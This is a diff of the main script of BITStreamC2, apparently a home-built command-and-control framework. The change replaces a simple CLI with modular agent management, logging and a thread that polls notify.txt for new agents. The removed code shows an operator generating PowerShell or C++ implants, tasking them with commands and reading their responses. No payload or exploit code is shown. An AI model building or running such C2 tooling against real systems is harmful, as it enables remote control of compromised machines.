@@ -1,147 +1,64 @@
 import os
-import json
-import subprocess
+from colorama import init, Fore, Style
+from agent_manager import AgentManager
+from server_control import start_server, stop_server
+from cli import run_cli
+from utils import log_error, log_info
+import threading
 import time
-import generate_implant
+
+# Initialize colorama
+init(strip=False, autoreset=True)
 
 # Directories and files
 BASE_DIR = os.getcwd()
-COMMAND_FILE = os.path.join(BASE_DIR, "commands/command.json")
+COMMAND_DIR = os.path.join(BASE_DIR, "commands")
 UPLOAD_DIR = os.path.join(BASE_DIR, "uploads")
-RESULT_FILE = os.path.join(UPLOAD_DIR, "response.txt")
-
-# Ensure directories exist
-os.makedirs(os.path.dirname(COMMAND_FILE), exist_ok=True)
-os.makedirs(UPLOAD_DIR, exist_ok=True)
-
-# Path to the server script (replace with the actual server script name)
+LOG_FILE = os.path.join(BASE_DIR, "logs", "c2.log")
+AGENT_CONFIG = os.path.join(BASE_DIR, "agents.json")
+NOTIFY_FILE = os.path.join(UPLOAD_DIR, "notify.txt")
 SERVER_SCRIPT = "server.py"
 
-# Start the server script
-def start_server():
-    if not os.path.exists(SERVER_SCRIPT):
-        print(f"[-] Server script '{SERVER_SCRIPT}' not found.")
-        return None
+# Ensure directories exist
+os.makedirs(COMMAND_DIR, exist_ok=True)
+os.makedirs(UPLOAD_DIR, exist_ok=True)
+os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
 
-    print(f"[*] Starting server script: {SERVER_SCRIPT}...")
-    server_process = subprocess.Popen(["python2", SERVER_SCRIPT], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    time.sleep(2)  # Give the server time to start
-    return server_process
-
-def show_implants():
-    print("To be built!")
-
-# Stop the server script
-def stop_server(server_process):
-    if server_process:
-        print("[*] Stopping server script...")
-        server_process.terminate()
-        server_process.wait()
-        print("[+] Server stopped.")
-
-def help_menu():
-    print("Help Menu")
-    print("[*] show implants -> Show active implants")
-    print("[*] generate implant (ps1 or cpp) -> Generate an implant using either Powershell or C++ (C++ source code will need to be compiled on external Windows system")
-    print("[*] show command -> Show current command to be taksed to implant")
-    print("[*] set command -> Set a command to be tasked to implant")
-    print("[*] show response -> View implant response")
-    print("[*] help -> Show this help menu")
-    print("[*] exit")
-
-# CLI interface
-def c2_cli():
-    os.system('clear')
-    print("\n=== BITSreamC2 ===")
-    help_menu()
-
+def monitor_notify_file(agent_manager):
+    """Periodically check notify.txt for new agents."""
     while True:
-        choice = input("\nBSC2> ")
-        if choice == "clear" or choice == "cls":
-            os.system('clear')
-            
-        elif choice == "show implants" or choice == "sh imp":
-            show_implants()
-            
-        elif choice == "generate implant ps1" or choice == "gen imp ps1":
-            lang = "ps1"
-            gen_implant(lang)
-            
-        elif choice == "generate implant cpp" or choice == "gen imp cpp":
-            lang = "cpp"
-            gen_implant(lang)
-            
-        elif choice == "show command" or choice == "sh cmd":
-            with open(COMMAND_FILE, "r") as f:
-                command_data = json.load(f)
-                command = command_data.get("command", "No command found")
-            print(f"[+] Current command for your implant is: {command}\n")
-            
-        elif choice == "set command" or choice == "set cmd":
-            set_command()
-            
-        elif choice == "show response" or choice == "sh resp":
-            view_response()
-            
-        elif choice == "exit":
-            print("Exiting...")
-            break
+        try:
+            log_info("Starting notify file check", agent_manager.log_file)
+            agent_manager.check_notify_file()
+            log_info("Completed notify file check", agent_manager.log_file)
+        except Exception as e:
+            log_error(f"Error in notify file monitor: {e}", agent_manager.log_file)
+        time.sleep(5)  # Check every 5 seconds
 
-        elif choice == "help":
-            help_menu()
-
-        else:
-            print("Invalid choice.\n")
-            help_menu()
-
-def show_command():
-    with open(COMMAND_FILE, "r") as f:
-        command_data = json.load(f)
-        command = command_data.get("command", "No command found")
-        print(f"[+] Current command for your implant is {command}\n")
-        
-# Set a new command
-def set_command():
-    command = input("Enter the command to send to the implant: ").strip()
-    if command:
-        command_data = {"command": command}
-        with open(COMMAND_FILE, "w") as f:
-            json.dump(command_data, f)
-        print(f"[+] Command saved to {COMMAND_FILE}.")
-    else:
-        print("[-] Command cannot be empty.")
-
-# View the latest response from the implant
-def view_response():
-    if os.path.exists(RESULT_FILE):
-        with open(RESULT_FILE, "r") as f:
-            response = f.read()
-        print(f"\n[ Implant Response ]:\n{response}")
-    else:
-        print("[-] No response file found.")
-
-def gen_implant(lang):
-    generate_implant.gen(lang)
-
-# Main function
 if __name__ == "__main__":
-    print("=== BITStreamC2 ===")
+    print(f"{Fore.MAGENTA}=== BITStreamC2 ==={Style.RESET_ALL}")
     print("[1] Start HTTP Server and Launch Operator Interface")
-    print("[2] Start SMB Server and Launch Operator Interface *TODO*")
     print("[2] Exit")
 
     option = input("\nSelect an option: ")
     if option == "1":
-        # Start the server script
-        server_process = start_server()
+        agent_manager = AgentManager(AGENT_CONFIG, UPLOAD_DIR)
+        agent_manager.log_file = LOG_FILE
+        server_process = start_server(SERVER_SCRIPT, LOG_FILE)
         if server_process:
             try:
-                # Launch the CLI interface
-                c2_cli()
+                # Start notify file monitoring thread
+                notify_thread = threading.Thread(target=monitor_notify_file, args=(agent_manager,), daemon=True)
+                notify_thread.start()
+                log_info("Started notify file monitoring thread", LOG_FILE)
+                run_cli(agent_manager)
+            except Exception as e:
+                log_error(f"Error in CLI or notify thread: {e}", LOG_FILE)
             finally:
-                # Stop the server script when exiting
-                stop_server(server_process)
+                stop_server(server_process, LOG_FILE)
     elif option == "2":
         print("Exiting...")
+        log_info("Exiting BITStreamC2", LOG_FILE)
     else:
-        print("Invalid option. Exiting...")
+        print(f"{Fore.RED}[-] Invalid option. Exiting...{Style.RESET_ALL}")
+        log_error("Invalid startup option", LOG_FILE)
